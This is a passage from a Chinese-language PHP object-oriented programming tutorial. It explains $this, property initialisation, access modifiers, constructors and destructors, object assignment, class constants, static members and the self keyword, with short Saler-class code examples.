<li>类存在，将类内部的属性部分复制一份，然后在内存（堆区）开辟一块内存空间，将属性放到里面，同时内部有一个指针指向类的内存空间（代码段）</li>
<li>对象访问属性即访问的是对象空间里存储的部分</li>
<li>对象访问方法是对象通过内部指针找到类空间中的方法，然后在内存（栈区）开辟运行</li>
</ul>
</li>
<li><p>$this是系统在方法内置的对象通用名字</p>
<ul>
<li><p>对象在调用方法的时候，系统会自动找到对象所保存的内存地址（堆区），然后把地址赋值给$this</p>
</li>
<li><p>方法内部的$this就代表调用当前$this所在方法的外部对象</p>
</li>
<li><p>$this的本质是函数内部的一个局部变量，只是系统自动对其进行赋值，而且一定是调用方法的对象本身</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>类内部方法内有一个内置对象$this，代表访问该方法的外部对象</li>
<li>类在实例化对象的时候要保证内存中有该类</li>
<li>一个类可以实例化多个对象，每个对象访问成员方法时，$this就代表对应对象</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：面向对象中，属性在定义类结构的时候是否需要赋值？到底该如何使用访问修饰限定符呢？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：站在开发者的角度，并没有任何强制规定属性在类中定义的时候就需要初始化，也没有任何规定访问修饰限定符到底该用哪个。但是从业务需求和隐私保护角度出发，有一些规则需要我们遵循。</p>
</blockquote>
<h3 id="6-面向对象开发规范【掌握】"><a href="#6-面向对象开发规范【掌握】" class="headerlink" title="6.面向对象开发规范【掌握】"></a>6.面向对象开发规范【掌握】</h3><blockquote>
<p><strong>定义</strong>：面向对象规范是指我们在开发时，在技术没有强制规定的情况下，应该采用什么样的方式来协助我们进行代码的书写。</p>
</blockquote>
<ol>
<li>属性的初始化：属性是类对于同类事务所抽离出来的共性<code>数据</code>，本身在类结构中没有价值，是当具体对象产生之后，属于对象本身的。因此在进行类中定义属性的时候，通常不会对属性进行初始化，除非属性本身的值也具有共性</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span>;				</span><br><span class="line">    <span class="comment">//某个卖家拥有的商品数量，每位具体卖家对象拥有的不可能一样，所以没必要初始化</span></span><br><span class="line">  	<span class="keyword">protected</span> <span class="variable">$discount</span>;</span><br><span class="line">    <span class="comment">//某个卖家针对销售的折扣，同样没有统一的价值</span></span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//某个卖家的账户余额，任何一位卖家一开始做生意的时候，账户余额都为0，所以可以初始化</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>属性的初始化：属性在类中初始化的基本判定就是数据是否初始化的时候统一，如果数据统一（即初始化），那么所有对象在生成之后，就拥有对应的值；如果不初始化，意味着所有对象在生成后，应该对属性进行赋值。</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span>;				</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">0</span>;</span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">new</span> Saler();	<span class="comment">//所有对象都有两个属性，其中$count都没有数据，而$money都为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//生成对象后，对象对自己的属性进行初始化</span></span><br><span class="line"><span class="variable">$s1</span>-&gt;count = <span class="number">100</span>;	</span><br><span class="line"><span class="variable">$s2</span>-&gt;count = <span class="number">1000</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>访问修饰限定符选择：访问修饰限定符是用来限制类成员被对象访问时对象所处位置的。访问的权限从public、protected到private依次变小。使用规则如下：</li>
</ol>
<ul>
<li>设定好的类成员本身不会被外部用到，那么应该使用private或者protected</li>
<li>设定好的类成员一定会给外部访问，使用public</li>
<li>属性通常private居多，如果需要外部访问属性，通常会定义相关方法来实现属性的查看和修改，因为可以在方法内对数据逻辑进行代码控制，安全</li>
<li>总之一句话：尽可能增加类对成员的控制（尽可能多使用private，少使用public）</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span>;				</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span> = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//增加方法操作私有属性money</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getMoney</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;money;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setMoney</span>(<span class="params"><span class="variable">$money</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//可以对逻辑进行修改，对数据进行安全判定，保证数据的安全性</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;money = <span class="variable">$money</span>;</span><br><span class="line">        <span class="comment">//$this-&gt;money是属性，$money是外部传入的参数，二者同名但是性质完全不同</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>属性在类中定义的时候，通常不会初始化值，除非所有类实例化得到的对象的某个属性需要是统一值</li>
<li>应该尽可能增加类对成员的控制，即使用范围较小的访问修饰限定符优先</li>
<li>属性通常是私有化的，一般是通过设定方法来实现属性的访问和修改</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：属性一般不会在类定义的时候就初始化，那实例化对象的时候，属性的数据不都是为空吗？这样的数据有什么价值呢？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：属性属于对象使用，在类中初始化的确没有太多价值，但是对象实例化之后如果属性数据为空也没有价值。因此通常属性都是在对象实例化的时候进行初始化的，这个时候就需要用到一种自动<code>构造</code>的方式来完成</p>
</blockquote>
<h3 id="7-构造方法【掌握】"><a href="#7-构造方法【掌握】" class="headerlink" title="7.构造方法【掌握】"></a>7.构造方法【掌握】</h3><blockquote>
<p><strong>定义</strong>：构造方法__construct()，是一种类结构特有的特殊方法，该方法由系统规定好，开发人员在定义的时候只需要写<strong>抄</strong>一遍，有了构造方法的类在实例化对象之后，对象就会自动调用。</p>
</blockquote>
<ol>
<li>构造方法实现：在类中增加一个方法__construct()即可</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span>;				</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>构造方法也是一个普通方法，不普通的地方在于，类实例化得到的对象会马上自动调用</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//接上述代码</span></span><br><span class="line"><span class="keyword">new</span> Saler();				<span class="comment">//输出Saler</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>构造方法的意义：构造方法是对象实例化的时候用来初始化对象的资源的，所以通常是用来初始化对象的属性或者其他资源初始化</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span>;				</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造方法：初始化属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;count = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;money = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>如果属性的数据在构造方法中初始化是固定写死的，那么与直接在定义类的时候初始化属性一样。意味着数据没有任何价值（所有对象都相同），因此通常是通过构造方法的参数来实现数据的外部传入</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span>;				</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造方法：初始化属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$count</span>,<span class="variable">$money</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;count = <span class="variable">$count</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;money = <span class="variable">$money</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>一旦构造方法拥有了形参，那么对象在调用该方法的时候就需要传入对应的实参，而构造方法又是自动调用的，所以需要在实例化对象的时候使用new 类名(构造方法对应的实参列表)来实现</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//接上述代码</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler(<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line"><span class="variable">$s2</span> = <span class="keyword">new</span> Saler(<span class="number">1000</span>,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：之前所说的<code>new 类名</code> 和<code>new 类名()</code>没有区别是因为没有构造方法，或者构造方法没有参数限定，一旦构造方法有了参数，那么<code>new 类名</code> 就不能直接使用了。</p>
<ol start="6">
<li>构造方法不管再怎么特殊，也是用户定义的方法，言外之意除了在实例化对象时对象会自动调用之外，我们也可以手动调用构造方法（但是一般没有价值，因为对象实例化时会自动调用）</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//属性</span></span><br><span class="line">  	<span class="keyword">public</span> <span class="variable">$count</span>;				</span><br><span class="line">  	<span class="keyword">private</span> <span class="variable">$money</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//构造方法：初始化属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$count</span>,<span class="variable">$money</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;count = <span class="variable">$count</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;money = <span class="variable">$money</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler(<span class="number">100</span>,<span class="number">100</span>);			<span class="comment">//系统在new Saler(100,100)好之后，会自动调用一次</span></span><br><span class="line"><span class="variable">$s</span>-&gt;__construct(<span class="number">1000</span>,<span class="number">1000</span>);			<span class="comment">//允许手动调用</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>构造方法__construct()是一种系统内置的方法，该方法的特性是会在对象实例化之后，对象立即自动调用</li>
<li>构造方法的目的就是为了初始化资源，包含对象属性和其他资源</li>
<li>一旦构造方法定义好之后，且构造方法自带参数，那么就只能使用<code>new 类名(参数列表)</code>方式才能正确实例化</li>
<li>构造方法可以当做普通方法由对象调用（不建议）</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：构造方法是用来实现资源的初始化的，那么有没有需求来实现资源的释放呢？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：理论上讲，一种资源被初始化通常需要在不用的时候给释放掉，这样的程序才是好的程序。而PHP有个特点，就是脚本运行结束后系统自动回收所有内存，这就决定了PHP开发者大多数时候不喜欢额外做释放资源的工作。同样的，对象有构造方法初始化资源，也有<code>析构方法</code>释放资源。</p>
</blockquote>
<h3 id="8-析构方法【了解】"><a href="#8-析构方法【了解】" class="headerlink" title="8.析构方法【了解】"></a>8.析构方法【了解】</h3><blockquote>
<p><strong>定义</strong>：析构方法__destruct()，也是一种类结构中特殊的方法，与构造方法一样，也是系统规定好，只需要开发人员<strong>抄</strong>一遍即可，对象在被销毁时会自动调用。</p>
</blockquote>
<ol>
<li>析构方法实现：类中增加一个__destruct()方法</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//析构方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>析构方法调用：析构方法是在对象被销毁时自动，对象的“垂死挣扎”</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//接上述代码</span></span><br><span class="line"><span class="comment">//实例化</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$s</span>);			<span class="comment">//删除对象</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>析构方法是对象用来调用释放对象中的资源，不是用来删除对象的</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">  	<span class="comment">//析构方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//销毁对象所占用资源的代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>析构方法也是普通方法，可以由对象直接调用</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//接析构方法实现代码</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;__destruct();		<span class="comment">//思考：此时对象是否被销毁？</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li>对象销毁情形</li>
</ol>
<ul>
<li>保存对象的变量被用来保存其他数据，导致对象内存没有任何变量引用</li>
<li>删除对象变量</li>
<li>脚本执行结束：释放所有变量</li>
</ul>
<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>析构方法是一种对象销毁时自动调用的方法</li>
<li>析构方法是用来对象销毁自身所占用的资源</li>
<li>PHP中脚本执行结束，系统会自动回收所有资源，因此一般PHP中很少使用析构方法</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：在PHP中，变量赋值是值传递的，即变量赋值给另外一个变量，两个变量是不同的。如果变量保存的是对象，那么给变量赋值的时候，会产生两个对象吗？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：对象的产生是由实例化得到的，因此如果是将保存对象的变量赋值给另外一个变量，这个过程是不会产生新的变量的。</p>
</blockquote>
<h3 id="9-对象传值【了解】"><a href="#9-对象传值【了解】" class="headerlink" title="9.对象传值【了解】"></a>9.对象传值【了解】</h3><blockquote>
<p><strong>定义</strong>：对象传值，其实就是将保存对象的变量赋值给另外一个变量，在PHP中，对象的传值是<strong>引用传递</strong>的：即一个对象变量赋值给另外一个变量，两个变量指向同一个对象的内存地址，即只有一个对象。</p>
</blockquote>
<ol>
<li>对象传值就是保存对象的变量赋值给另外一个变量</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s2</span> = <span class="variable">$s1</span>;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>对象传值是引用传递，不管对象赋值给多少个变量，内存中只有一个对象</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s2</span> = <span class="variable">$s1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//证明</span></span><br><span class="line">var_dump(<span class="variable">$s1</span>,<span class="variable">$s2</span>);		<span class="comment">//同一个对象</span></span><br><span class="line"><span class="variable">$s1</span>-&gt;name = <span class="string">&#x27;Saler&#x27;</span>;	<span class="comment">//更改一个变量所保存对象的属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s2</span>-&gt;name;			<span class="comment">//输出Saler</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结</strong>：对象传值是引用传值，一般情况下不会在项目中用到。</p>
</blockquote>
<hr>
<blockquote>
<p><strong>思考</strong>：前面类成员中，属性和方法都已经清楚的知道是由对象来访问，唯独类常量没有被访问，类常量到底是如何访问的呢？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：类常量通过名字分析就知道是属于类的，因此类常量的访问是通过类来进行访问的。</p>
</blockquote>
<h3 id="10-范围解析操作符（类常量访问）【掌握】"><a href="#10-范围解析操作符（类常量访问）【掌握】" class="headerlink" title="10.范围解析操作符（类常量访问）【掌握】"></a>10.范围解析操作符（类常量访问）【掌握】</h3><blockquote>
<p><strong>定义</strong>：范围解析操作符，由两个冒号组成“**::**”，是专门用于类实现类成员操作的，可以实现类直接访问类成员。</p>
</blockquote>
<ol>
<li>类常量的普通访问尝试：尝试使用对象进行访问</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">	<span class="comment">//类常量</span></span><br><span class="line">    <span class="keyword">const</span> PI = <span class="number">3.14</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s1</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s1</span>-&gt;PI;			<span class="comment">//错误，$s1-&gt;PI最终转换的访问方式为:$PI，这个在类中并不存在</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>以上案例可以看出，对象无法访问类常量，那是因为类常量的定义本身就是用来给类访问的，对象是用来访问属性和方法的，类常量的访问方式为：类名::常量名</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">	<span class="comment">//类常量</span></span><br><span class="line">    <span class="keyword">const</span> PI = <span class="number">3.14</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> Saler::PI;			<span class="comment">//输出3.14</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>分析：类常量是固定的，而对象的属性是不同对象而不同的，成员方法简单的理解也是为属性本身进行加工的。因此有一些东西是专属于类的，而有部分内容是专门为对象提供的，所以就会有不同的成员拥有不同的访问方式</li>
</ol>
<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>类访问成员的方式是使用范围解析操作符“**::**”访问，由类名直接访问：类名::类常量</li>
<li>类本身是通过对同类对象的抽象而形成，所以属性和方法本身都是由对象来访问</li>
<li>类也需要有一些自身的数据和操作，这些就由类来进行访问</li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：类要访问的成员，都只能是类常量吗？毕竟类常量是一旦定义不可修改的，这样没有多大价值。</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：在类中，类成员只有三种：类常量、属性和方法，为了区分对象和类访问，可以使用<code>static</code>关键字来修饰属性和方法。</p>
</blockquote>
<h3 id="11-静态成员【掌握】"><a href="#11-静态成员【掌握】" class="headerlink" title="11.静态成员【掌握】"></a>11.静态成员【掌握】</h3><p><strong>定义</strong>：静态成员，使用static关键字修饰的类成员，表示该成员属于<strong>类访问</strong>。PHP静态成员有两种，静态属性和静态方法。</p>
<ol>
<li>静态属性：在类中定义属性的时候使用static关键字修饰，访问的时候只能使用类+范围解析操作符+静态属性访问</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$money</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;	<span class="comment">//静态属性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态成员可以直接使用类访问，而不需要先实例化对象</span></span><br><span class="line"><span class="keyword">echo</span> Saler::<span class="variable">$count</span>;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>静态方法：在定义方法的时候使用static关键字修饰，访问的时候使用类+范围解析操作符+静态方法名字()访问</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showClass</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类直接访问</span></span><br><span class="line">Saler::showClass();</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>在类的内部也可以访问静态成员，同样是使用类名+范围解析操作符+静态属性/静态方法()</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;			<span class="comment">//私有，不允许外部直接访问</span></span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showClass</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> Saler::<span class="variable">$count</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类直接访问</span></span><br><span class="line">Saler::showClass();</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>静态方法本质也是类中定义的方法，因此也可以使用对象进行访问，但是<strong>不建议</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$count</span> = <span class="number">0</span>;			<span class="comment">//私有，不允许外部直接访问</span></span><br><span class="line">	<span class="comment">//方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">showClass</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> Saler::<span class="variable">$count</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对象访问静态方法</span></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> Saler();</span><br><span class="line"><span class="variable">$s</span>-&gt;showClass();						<span class="comment">//输出0</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li>同理，方法也是在类内部，在编译时就存在，因此可以通过类来进行访问，使用范围解析操作符，但是<strong>非常不建议</strong>（会报错：因为类只允许访问静态成员和类常量）</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testStatic</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类访问普通成员方法</span></span><br><span class="line">Saler::testStatic();				<span class="comment">//输出testStatic，但是报错，当前访问的不是静态方法</span></span><br></pre></td></tr></table></figure>
<ol start="6">
<li>静态方法本质是给类访问，所以不允许在静态方法内部使用$this对象</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">testStaticThis</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>);				<span class="comment">//致命错误：$this放到了不该放的位置</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>总结</strong></p>
</blockquote>
<ol>
<li>为了保障类能直接访问数据和操作数据，可以在属性和方法前增加static关键字变成静态属性和静态方法</li>
<li>类通过类名+范围解析操作符+静态成员的方式进行访问</li>
<li>静态成员也收访问修饰限定符的限定，访问权限与普通属性和方法的限制一样</li>
<li>对象可以无条件访问静态方法，而类只能访问不带$this的普通方法（不建议）</li>
<li>静态成员是给类访问的，非静态成员是给对象访问的</li>
<li>静态成员的访问效率比非静态成员高，因此有种说法是能用静态的时候就不用非静态  </li>
</ol>
<hr>
<blockquote>
<p><strong>思考</strong>：类的内部的静态方法内可能会访问到其他静态成员或者类常量，这个时候必须每次使用类名，那如果类名修改的话岂不是很麻烦？</p>
</blockquote>
<blockquote>
<p><strong>引入</strong>：静态成员或者类常量的访问是必须使用类名进行访问的，不过为了方便类名的更新，减少开发者维护成本，系统引入了一个类似$this代表对象的方案：self关键字</p>
</blockquote>
<h3 id="12-self关键字【掌握】"><a href="#12-self关键字【掌握】" class="headerlink" title="12. self关键字【掌握】"></a>12. self关键字【掌握】</h3><blockquote>
<p><strong>定义</strong>：self关键字是一种在类的内部（方法里面）使用，代替类名的写法。能够保障用户方便修改类名字。</p>
</blockquote>
<ol>
<li>self是用来代替类名的，与范围解析操作符<code>::</code>一起使用的</li>
</ol>
